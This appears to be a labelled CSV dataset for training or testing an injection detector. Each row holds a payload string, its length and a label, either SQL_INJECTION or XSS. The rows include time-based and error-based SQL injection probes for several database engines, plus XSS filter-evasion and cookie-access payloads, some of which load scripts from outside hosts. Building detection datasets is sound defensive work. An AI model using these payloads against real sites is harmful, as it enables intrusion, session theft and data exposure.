payload,length,label
"-2211"" or 2113=8885#",20,SQL_INJECTION
"1'||(select 'eils' where 8308=8308 or 8514=benchmark(5000000,md5(0x544d5a4c))#",78,SQL_INJECTION
"1"" where 5098=5098 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--",207,SQL_INJECTION
"1)) as faxr where 7972=7972 or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",125,SQL_INJECTION
"1'||(select 'yaii' from dual where 7317=7317 union all select null,null,null,null,null,null,null,null,null#",107,SQL_INJECTION
1) or (select * from (select(sleep(5)))sddo)#,45,SQL_INJECTION
1' rlike (select (case when (7689=7689) then 1 else 0x28 end)),62,SQL_INJECTION
"1%')) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and (('%'='",108,SQL_INJECTION
"1 where 7072=7072 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)--",220,SQL_INJECTION
"-5360' where 8178=8178 union all select 8178,8178,8178--",56,SQL_INJECTION
"1') or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and ('thce'='thce",123,SQL_INJECTION
"1"" and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))",63,SQL_INJECTION
"1"";select like('abcdefg',upper(hex(randomblob(500000000/2))))",61,SQL_INJECTION
1'||(select 'vxfx' where 7038=7038 and 9306=4187)||',52,SQL_INJECTION
"1);select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual",84,SQL_INJECTION
"1""))) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (((""oohx"" like ""oohx",91,SQL_INJECTION
1'||(select 'brde' where 7390=7390 and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))||',237,SQL_INJECTION
"-6294"" union all select 9921,9921,9921,9921,9921,9921--",55,SQL_INJECTION
"-1630' union all select 1971,1971--",35,SQL_INJECTION
"1) or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",97,SQL_INJECTION
-9072) as saot where 2278=2278 order by 1#,42,SQL_INJECTION
"-3699%'))) union all select 8241,8241,8241,8241,8241,8241,8241,8241,8241#",73,SQL_INJECTION
1')));waitfor delay '0:0:5'--,29,SQL_INJECTION
"1' where 2162=2162 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",109,SQL_INJECTION
"1') and elt(1210=1210,sleep(5)) and ('gtov' like 'gtov",54,SQL_INJECTION
"-1808%"")) or 4595=3545 and ((""%""=""",34,SQL_INJECTION
1')) as pdrg where 5960=5960 and 9198=9198--,44,SQL_INJECTION
"1"")) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ((""kpwc"" like ""kpwc",125,SQL_INJECTION
"-9297) union all select 6841,6841,6841,6841,6841--",50,SQL_INJECTION
"1"" and 8407=(select count(*) from generate_series(1,5000000)) and ""zwov""=""zwov",78,SQL_INJECTION
"1') procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and ('lkun' like 'lkun",156,SQL_INJECTION
"-8824%')) or make_set(9354=9354,7185) and (('%'='",49,SQL_INJECTION
"1'+(select mkbv where 1648=1648 and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",139,SQL_INJECTION
"1%""))) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and (((""%""=""",93,SQL_INJECTION
1'))) and 2006=2006,19,SQL_INJECTION
"1"") where 2657=2657 and 5309=7592--",35,SQL_INJECTION
"1"") where 6138=6138 and 8594=(select 8594 from pg_sleep(5))--",61,SQL_INJECTION
"1"") as esks where 1138=1138;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",144,SQL_INJECTION
-1621' in boolean mode) order by 1--,36,SQL_INJECTION
"1')) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (('miba'='miba",117,SQL_INJECTION
"1'+(select 'feof' where 1966=1966;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5))+'",151,SQL_INJECTION
1)) as myxo where 1759=1759 union all select null#,50,SQL_INJECTION
1 where 1636=1636 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')--,113,SQL_INJECTION
"1') or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)",103,SQL_INJECTION
"-6095"") as hygc where 8142=8142 or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",213,SQL_INJECTION
"1') or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and ('nopu'='nopu",123,SQL_INJECTION
1'))) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((('nfix'='nfix,224,SQL_INJECTION
"1' or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",111,SQL_INJECTION
"1)) union all select null,null,null,null,null,null,null,null,null#",66,SQL_INJECTION
"1') and 8407=(select count(*) from generate_series(1,5000000)) and ('qfwc'='qfwc",80,SQL_INJECTION
"1%""))) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and (((""%""=""",108,SQL_INJECTION
1' or sleep(5) and 'rpqn' like 'rpqn,36,SQL_INJECTION
"1)) and elt(1210=1210,sleep(5)) and ((5874=5874",47,SQL_INJECTION
"1')) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (('agsi'='agsi",123,SQL_INJECTION
"1')) as owcw where 1107=1107 and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",104,SQL_INJECTION
"1')));call regexp_substring(repeat(right(char(2385),0),500000000),null)--",73,SQL_INJECTION
-3096' or 3821=5539 and 'zrth'='zrth,36,SQL_INJECTION
"1) where 2020=2020 and 2388=benchmark(5000000,md5(0x6d457153))#",63,SQL_INJECTION
"1"") as jiyl where 4893=4893 union all select null,null,null,null,null#",70,SQL_INJECTION
"1',exp(~(select * from (select concat(0x7171706a71,(select (elt(7759=7759,1))),0x717a767a71,0x78))x))",101,SQL_INJECTION
"-5691' union all select 6610,6610#",34,SQL_INJECTION
"1) where 5234=5234 or 8514=benchmark(5000000,md5(0x544d5a4c))#",62,SQL_INJECTION
1'||(select 'vwls' where 5252=5252 rlike sleep(5)#,50,SQL_INJECTION
1')) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (('foop' like 'foop,227,SQL_INJECTION
"1'||(select 'dezl' where 8661=8661;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)||'",133,SQL_INJECTION
"1') and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ('xikz' like 'xikz",87,SQL_INJECTION
1')) as cyom where 2318=2318 and 7533=7533--,44,SQL_INJECTION
-5580 or 4829=1968,18,SQL_INJECTION
"1""))) or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",103,SQL_INJECTION
1')));select (case when (6969=5797) then 6969 else 6969*(select 6969 from information_schema.character_sets) end)#,114,SQL_INJECTION
"1%""))) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((""%""=""",200,SQL_INJECTION
"1' in boolean mode) union all select null,null,null,null--",58,SQL_INJECTION
-8945)) as fszo where 2320=2320 union all select 2320--,55,SQL_INJECTION
"1%') and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ('%'='",211,SQL_INJECTION
"1%' or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and '%'='",118,SQL_INJECTION
prompt(1);>,11,XSS
"-1302"")) as rshr where 2800=2800 or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",236,SQL_INJECTION
"1' or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and 'aytf' like 'aytf",84,SQL_INJECTION
"1' where 4272=4272 union all select null,null,null,null#",56,SQL_INJECTION
"-6854"" where 7794=7794 union all select 7794,7794--",51,SQL_INJECTION
1'+(select bfeq where 3445=3445 and 9198=9198--,47,SQL_INJECTION
"1')) or 8156=(select count(*) from generate_series(1,5000000))--",64,SQL_INJECTION
"1' and elt(3247=3969,3969) and 'xcbm' like 'xcbm",48,SQL_INJECTION
"1%') and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",145,SQL_INJECTION
"1%'))) and 8407=(select count(*) from generate_series(1,5000000)) and ((('%'='",78,SQL_INJECTION
(select (case when (9263=9263) then 1 else 9263*(select 9263 from mysql.db) end)),81,SQL_INJECTION
"-9015%"") union all select 6948,6948--",37,SQL_INJECTION
"1'+(select sshu where 3442=3442 and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))))+'",190,SQL_INJECTION
"1') where 1470=1470 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",160,SQL_INJECTION
-5449' or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and 'ryvy' like 'ryvy,226,SQL_INJECTION
"1%"")) and elt(4249=4249,7259) and ((""%""=""",41,SQL_INJECTION
-7773' or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq'),99,SQL_INJECTION
"1"" order by 1--",15,SQL_INJECTION
"1' procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and 'swke'='swke",149,SQL_INJECTION
"-7511)) as xqzf where 9939=9939 union all select 9939,9939,9939,9939,9939,9939,9939--",85,SQL_INJECTION
"<body onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(""crosssitescripting"")>",67,XSS
"<table background=""javascript:alert('crosssitescripting')"">",59,XSS
"<table><td background=""javascript:alert('crosssitescripting')"">",63,XSS
"<br size=""&{alert('crosssitescripting')}"">",42,XSS
"<a href=""http://server.com/"">crosssitescripting</a>",51,XSS
"<a href=""http://1113982867/"">crosssitescripting</a>",51,XSS
"<a href=""javascript:document.location='http://www.vulnerability-lab.com/'"">crosssitescripting</a>",97,XSS
""";alert('crosssitescripting');//",32,XSS
"<input type=""image"" src=""javascript:alert('crosssitescripting');"">",66,XSS
scriptalert(crosssitescripting)/script,38,XSS
"<img style=""crosssitescripting:expr/*crosssitescripting*/ession(alert('crosssitescripting'))"">",94,XSS
"<html xmlns:crosssitescripting><?import namespace=""crosssitescripting"" implementation=""http://ha.ckers.org/crosssitescripting.htc""><crosssitescripting:crosssitescripting>crosssitescripting</crosssitescripting:crosssitescripting>",228,XSS
"<xml id=i><x><c><![cdata[<img src=""javas]]><![cdata[cript:alert('crosssitescripting');"">]]>",91,XSS
"<xml id=""crosssitescripting""><i><b><img src=""javas<!-- -->cript:alert('crosssitescripting')""></b></i></xml>",107,XSS
"<span datasrc=""#crosssitescripting"" datafld=""b"" dataformatas=""html""></span>",75,XSS
"<?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time"">",63,XSS
"<?import namespace=""t"" implementation=""#default#time2"">",55,XSS
</body></html>,14,XSS
"<script src=""http://vulnerability-lab.com/crosssitescripting.jpg""></script>",75,XSS
"<img src=""http://www.vulnerability-lab.com/file.php?variables=malicious"">",73,XSS
<iframe src=http://test.de>,27,XSS
><img id=xss src=x onerror=alert(xss);>,39,XSS
";!--""<xss>=&{()}""",17,XSS
<img id=xss src=javascript:alert('xss')>,40,XSS
"<img id=xss src=javascript:alert(""xss"")>",40,XSS
"<img id=xss src=""jav ascript:alert('xss');"">",44,XSS
"<img id=xss src=javascript:alert(""xss"")>"";' >",45,XSS
"<<script>alert(""xss"");//<</script>",34,XSS
""";alert('xss');//",17,XSS
<script>alert(/xss/.source)</script>,36,XSS
"<body background=""javascript:alert('xss')"">",43,XSS
"<input type=""image"" id=xss src=""javascript:alert('xss');"">",58,XSS
<script>alert('xssya')</script>,31,XSS
1<script>prompt(999691)</script>,32,XSS
//1<script>prompt(919397)</script>,34,XSS
"'""</script><script>alert('xssya')</script>",42,XSS
1<script >prompt(962477)</script>,33,XSS
"""><script>alert('xssya')</script>",33,XSS
"'';!--""<xss>=&{()}",18,XSS
""";alert(1)//",12,XSS
<script>alert('xssya');</script>,32,XSS
<scr<script>ipt>alert(1)</scr<script>ipt>,41,XSS
javascript:alert(1)//,21,XSS
"""x:alert"" onerror=""eval(src+'(0)')"">",36,XSS
"data:text/html,<script>alert(0)</script>",40,XSS
<img+src=x+onerror=prompt(1);>,30,XSS
<video+src=x+onerror=prompt(1);>,32,XSS
""";alert('xss)//",15,XSS
"<img """"""><script>alert(""xss"")</script>"">",40,XSS
"<iframe/src=""data:text/html; base64 ,pgjvzhkgb25sb2fkpwfszxj0kdeppg=="">",71,XSS
"""javascript:alert(1)""><input type=submit>",41,XSS
<isindex action=j a vas c r ipt:alert(1) type=image>,52,XSS
confirm(2)>,11,XSS
"""test""></form><button form=""test"" formaction=""javascript:alert(1)"">x</button>",77,XSS
write(1) autofocus>,19,XSS
javascript:alert(1)//></video>,30,XSS
alert(1)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>,69,XSS
"""alert(1)"">",11,XSS
"""alert(1)""><source></source></video>",36,XSS
alert(1)><input autofocus>,26,XSS
"""javascript:alert(1)"">clickme</math>",36,XSS
"<iframe srcdoc=""<img src=x:x onerror=alert(1)>"" />",50,XSS
"""x""><img onerror=""alert(1)""></picture>",38,XSS
""",,,,,x"" onerror=""alert(1)"">",28,XSS
"""javascript:alert(1)""></table>",30,XSS
"""</comment><img src=x onerror=alert(1)//"">",42,XSS
"""</style><img src=x onerror=alert(1)//"">",40,XSS
"content:url(data:image/svg+xml,<svg/>);visibility:hidden onload=alert(1)></div>",79,XSS
"""javascript://""/></head><body><a href=""/. /,alert(1)//",54,XSS
"""data:text/html;base64,phnjcmlwdd5hbgvydcgxktwvc2nyaxb0pg==""></embed>",69,XSS
<b <script>alert(1)//</script>0</script></b>,44,XSS
"document.getelementbyid(""div1"").innerhtml;</script>",51,XSS
width:1px;filter:glow onfilterchange=alert(1)>x</div>,53,XSS
"""x` `<script>alert(1)</script>""` `>",35,XSS
"alt=alert(1)//"">",16,XSS
xx:xx onerror=alert(1)//--!>,28,XSS
"""-o-link:'javascript:alert(1)';-o-link-source:current"">x</a>",60,XSS
x:expression8write(1)9>,23,XSS
"$,_=1}}).$=alert</script>",25,XSS
"function,[{}][0].constructor._('alert(1)')()</script>",53,XSS
"""#"">{alert(1)}</script>;1",25,XSS
"<meta http-equiv=""refresh"" content=""0;url=javascript:document.cookie=true;"">",76,XSS
"<meta http-equiv=""set-cookie"" content=""userid=<script>document.cookie=true</script>"">",85,XSS
"<img src=""jav ascript:document.cookie=true;"">",45,XSS
"<img src=""javascript:document.cookie=true;"">",44,XSS
"<body onload!#$%&()*~+-_.,:;?@[/|\\]^`=document.cookie=true;>",61,XSS
<script>document.cookie=true;//<</script>,41,XSS
"<iframe src=""javascript:document.cookie=true;>",46,XSS
<script>a=/crosssitescripting/ document.cookie=true;</script>,61,XSS
"<input type=""image"" src=""javascript:document.cookie=true;"">",59,XSS
"<body background=""javascript:document.cookie=true;"">",52,XSS
"<img dynsrc=""javascript:document.cookie=true;"">",47,XSS
"<img lowsrc=""javascript:document.cookie=true;"">",47,XSS
"<br size=""&{document.cookie=true}"">",35,XSS
"<layer src=""javascript:document.cookie=true;""></layer>",54,XSS
"<style>li {list-style-image: url(""javascript:document.cookie=true;"");</style><ul><li>crosssitescripting",103,XSS
scriptdocument.cookie=true;/script,34,XSS
"<frameset><frame src=""javascript:document.cookie=true;""></frameset>",67,XSS
"<table background=""javascript:document.cookie=true;"">",53,XSS
"<div style=""background-image: url(javascript:document.cookie=true;)"">",69,XSS
"<div style=""width: expression(document.cookie=true);"">",54,XSS
"<img style=""crosssitescripting:expr/*crosssitescripting*/ession(document.cookie=true)"">",87,XSS
"<crosssitescripting style=""crosssitescripting:expression(document.cookie=true)"">",80,XSS
"<style type=""text/javascript"">document.cookie=true;</style>",59,XSS
<body onload=alert('xss')>,26,XSS
"<style type=""text/css"">body{background:url(""javascript:document.cookie=true"")}</style>",86,XSS
"<base href=""javascript:document.cookie=true;//"">",48,XSS
"<xml id=i><x><c><![cdata[<img src=""javas]]<![cdata[cript:document.cookie=true;"">]]</c></x></xml><span datasrc=#i datafld=c dataformatas=html></span>",148,XSS
"<xml id=""crosssitescripting""><i><b><img src=""javas<!-- -->cript:document.cookie=true""></b></i></xml><span datasrc=""#crosssitescripting"" datafld=""b"" dataformatas=""html""></span>",175,XSS
<? echo('<scr)';echo('ipt>document.cookie=true</script>'); ?>,61,XSS
"<head><meta http-equiv=""content-type"" content=""text/html; charset=utf-7""> </head>+adw-script+ad4-document.cookie=true;+adw-/script+ad4-",135,XSS
"<div onmouseover=""document.cookie=true;"">",41,XSS
"<input type=""image"" dynsrc=""javascript:document.cookie=true;"">",62,XSS
&{document.cookie=true;};,25,XSS
<img src=&{document.cookie=true;};>,35,XSS
"<img src=""livescript:document.cookie=true;"">",44,XSS
"<a href=""about:<script>document.cookie=true;</script>"">",55,XSS
"<div style=""background-image: url(javascript:document.cookie=true;);"">",70,XSS
"<div style=""behaviour: url([link to code]);"">",45,XSS
"<div style=""width: expression(document.cookie=true;);"">",55,XSS
"<object classid=""clsid:..."" codebase=""javascript:document.cookie=true;"">",72,XSS
<<script>document.cookie=true;</script>,39,XSS
<script>document.cookie=true;//--></script>,43,XSS
"<img src=""blah""onmouseover=""document.cookie=true;"">",51,XSS
"<img src=""blah>"" onmouseover=""document.cookie=true;"">",53,XSS
"<xml id=""x""><a><b><script>document.cookie=true;</script>;</b></a></xml>",71,XSS
"<div datafld=""b"" dataformatas=""html"" datasrc=""#x""></div> ]]> [a][a]script>document.cookie=true;[a][a]/script>",109,XSS
">""<meta http-equiv=""set-cookie"" content=""userid=<script>document.cookie=true</script>"">",87,XSS
">""<script>document.cookie=true;</script>",40,XSS
">""<img src=""javascript:document.cookie=true;"">",46,XSS
">""<img src="" javascript:document.cookie=true;"">",47,XSS
">""<script>document.cookie=true;//<</script>",43,XSS
">""<script <b>document.cookie=true;</script>",43,XSS
">""<script>a=/crosssitescripting/ document.cookie=true;</script>",63,XSS
">""</title><script>document.cookie=true;</script>",48,XSS
">""<body background=""javascript:document.cookie=true;"">",54,XSS
">""<body onload=document.cookie=true;>",37,XSS
">""<img lowsrc=""javascript:document.cookie=true;"">",49,XSS
">""<bgsound src=""javascript:document.cookie=true;"">",50,XSS
">""<layer src=""javascript:document.cookie=true;""></layer>",56,XSS
">""<link rel=""stylesheet"" href=""javascript:document.cookie=true;"">",65,XSS
">""scriptdocument.cookie=true;/script",36,XSS
">""<iframe src=""javascript:document.cookie=true;""></iframe>",58,XSS
">""<table background=""javascript:document.cookie=true;"">",55,XSS
">""<table><td background=""javascript:document.cookie=true;"">",59,XSS
">""<div style=""width: expression(document.cookie=true);"">",56,XSS
">""<style>@im\\port'\\ja asc ipt:document.cookie=true';</style>",62,XSS
">""<crosssitescripting style=""crosssitescripting:expression(document.cookie=true)"">",82,XSS
">""exp/*<a style='no\\crosssitescripting:nocrosssitescripting(""*//*"");crosssitescripting:ex/*crosssitescripting*//*/*/pression(document.cookie=true)'>",149,XSS
">""<style>.crosssitescripting{background-image:url(""javascript:document.cookie=true"");}</style><a class=crosssitescripting></a>",126,XSS
">""<style type=""text/css"">body{background:url(""javascript:document.cookie=true"")}</style>",88,XSS
">""<object classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:document.cookie=true></object>",124,XSS
">""<xml id=i><x><c><![cdata[<img src=""javas]]<![cdata[cript:document.cookie=true;"">]]</c></x></xml><span datasrc=#i datafld=c dataformatas=html></span>",150,XSS
">""<html><body><?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""><?import namespace=""t"" implementation=""#default#time2""><t:set attributename=""innerhtml"" to=""crosssitescripting<script defer>document.cookie=true</script>""></body></html>",246,XSS
">""<? echo('<scr)';echo('ipt>document.cookie=true</script>'); ?>",63,XSS
">""<a href=""javascript#document.cookie=true;"">",45,XSS
">""<div onmouseover=""document.cookie=true;"">",43,XSS
">""&<script>document.cookie=true;</script>",41,XSS
">""&{document.cookie=true;};",27,XSS
">""<body onload=""document.cookie=true;"">",39,XSS
">""<div style=""background-image: url(javascript:document.cookie=true;);"">",72,XSS
">""<div style=""binding: url([link to code]);"">",45,XSS
">""<div style=""width: expression(document.cookie=true;);"">",57,XSS
">""<style><!--</style><script>document.cookie=true;//--></script>",64,XSS
">""<<script>document.cookie=true;</script>",41,XSS
">""<!-- -- --><script>document.cookie=true;</script><!-- -- -->",62,XSS
">""<img src=""blah""onmouseover=""document.cookie=true;"">",53,XSS
">""<xml src=""javascript:document.cookie=true;"">",46,XSS
">""<xml id=""x""><a><b><script>document.cookie=true;</script>;</b></a></xml>",73,XSS
"-1<meta http-equiv=""refresh"" content=""0;url=javascript:document.cookie=true;"">",78,XSS
"-1<meta http-equiv=""set-cookie"" content=""userid=<script>document.cookie=true</script>"">",87,XSS
"-1<img src=""jav ascript:document.cookie=true;"">",47,XSS
"-1<img src=""javascript:document.cookie=true;"">",46,XSS
"-1<body onload!#$%&()*~+-_.,:;?@[/|\\]^`=document.cookie=true;>",63,XSS
-1<script>document.cookie=true;//<</script>,43,XSS
"-1<iframe src=""javascript:document.cookie=true;>",48,XSS
-1<script>a=/crosssitescripting/ document.cookie=true;</script>,63,XSS
"-1<input type=""image"" src=""javascript:document.cookie=true;"">",61,XSS
"-1<body background=""javascript:document.cookie=true;"">",54,XSS
"-1<img dynsrc=""javascript:document.cookie=true;"">",49,XSS
"-1<img lowsrc=""javascript:document.cookie=true;"">",49,XSS
"-1<br size=""&{document.cookie=true}"">",37,XSS
"-1<layer src=""javascript:document.cookie=true;""></layer>",56,XSS
"-1<style>li {list-style-image: url(""javascript:document.cookie=true;"");</style><ul><li>crosssitescripting",105,XSS
-1scriptdocument.cookie=true;/script,36,XSS
"-1<frameset><frame src=""javascript:document.cookie=true;""></frameset>",69,XSS
"-1<table background=""javascript:document.cookie=true;"">",55,XSS
"-1<div style=""background-image: url(javascript:document.cookie=true;)"">",71,XSS
"-1<div style=""width: expression(document.cookie=true);"">",56,XSS
"-1<img style=""crosssitescripting:expr/*crosssitescripting*/ession(document.cookie=true)"">",89,XSS
"-1<crosssitescripting style=""crosssitescripting:expression(document.cookie=true)"">",82,XSS
"-1<style type=""text/javascript"">document.cookie=true;</style>",61,XSS
"-1<style>.crosssitescripting{background-image:url(""javascript:document.cookie=true"");}</style><a class=crosssitescripting></a>",126,XSS
"-1<base href=""javascript:document.cookie=true;//"">",50,XSS
"""><iframe src=a onload=alert(""vl"") <",36,XSS
"-1<xml id=i><x><c><![cdata[<img src=""javas]]<![cdata[cript:document.cookie=true;"">]]</c></x></xml><span datasrc=#i datafld=c dataformatas=html></span>",150,XSS
"-1<xml id=""crosssitescripting""><i><b><img src=""javas<!-- -->cript:document.cookie=true""></b></i></xml><span datasrc=""#crosssitescripting"" datafld=""b"" dataformatas=""html""></span>",177,XSS
-1<? echo('<scr)';echo('ipt>document.cookie=true</script>'); ?>,63,XSS
"-1<head><meta http-equiv=""content-type"" content=""text/html; charset=utf-7""> </head>+adw-script+ad4-document.cookie=true;+adw-/script+ad4-",137,XSS
"-1<div onmouseover=""document.cookie=true;"">",43,XSS
"-1<input type=""image"" dynsrc=""javascript:document.cookie=true;"">",64,XSS
-1&{document.cookie=true;};,27,XSS
-1<img src=&{document.cookie=true;};>,37,XSS
"-1<img src=""livescript:document.cookie=true;"">",46,XSS
"<img dyn id=xss src=""javascript:alert('xss')"">",46,XSS
"-1<body onload=""document.cookie=true;"">",39,XSS
"-1<div style=""background-image: url(javascript:document.cookie=true;);"">",72,XSS
"-1<div style=""binding: url([link to code]);"">",45,XSS
"-1<div style=""width: expression(document.cookie=true;);"">",57,XSS
-1<style><!--</style><script>document.cookie=true;//--></script>,64,XSS
-1<<script>document.cookie=true;</script>,41,XSS
-1<!-- -- --><script>document.cookie=true;</script><!-- -- -->,62,XSS
"-1<img src=""blah""onmouseover=""document.cookie=true;"">",53,XSS
"-1<xml src=""javascript:document.cookie=true;"">",46,XSS
"-1<xml id=""x""><a><b><script>document.cookie=true;</script>;</b></a></xml>",73,XSS
">""<iframe src=http://vulnerability-lab.com/>@gmail.com",54,XSS
">""<script>alert(document.cookie)</script><div style=""1@gmail.com",64,XSS
<iframe src=http://vulnerability-lab.com/>@gmail.com,52,XSS
"<script>alert(document.cookie)</script><div style=""1@gmail.com",62,XSS
"+49/>""<iframe src=http://vulnerability-lab.com>1337",51,XSS
"""><iframe src='' onload=alert('mphone')>",40,XSS
"><script>alert(""vlab"")</script>",31,XSS
">""<iframe src=http://vulnerability-lab.com></iframe>",52,XSS
"<button.onclick=""alert(string.fromcharcode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,34,67,114,111,115,115,83,105,116,101,83,99,114,105,112,116,105,110,103,64,82,69,77,7,86,69,34,41,60,47,115,99,114,105,112,116,62));"">string:from.char.code</button></body></html>",271,XSS
"';alert(string.fromcharcode(88,83,83))//';alert(string.fromcharcode(88,83,83))//"";alert(string.fromcharcode(67, 114, 111, 115, 115, 83, 105, 116, 101, 83, 99, 114, 105, 112, 116, 105, 110, 103))//"";alert(string.fromcharcode(67, 114, 111, 115, 115, 83, 105, 116, 101, 83, 99, 114, 105, 112, 116, 105, 110, 103))//--></script>"">'><script>alert(string.fromcharcode(67, 114, 111, 115, 115, 83, 105, 116, 101, 83, 99, 114, 105, 112, 116, 105, 110, 103))</script>",457,XSS
"<script>alert(""crosssitescripting2"")</script>",45,XSS
<script>alert(document.cookie)</script>,39,XSS
<script>alert('vl')</script>,28,XSS
"<!--#exec cmd=""/bin/echo '<scr'""--><!--#exec cmd=""/bin/echo 'ipt src=http://vulnerability-lab.com/crosssitescripting.js></script>'""-->",134,XSS
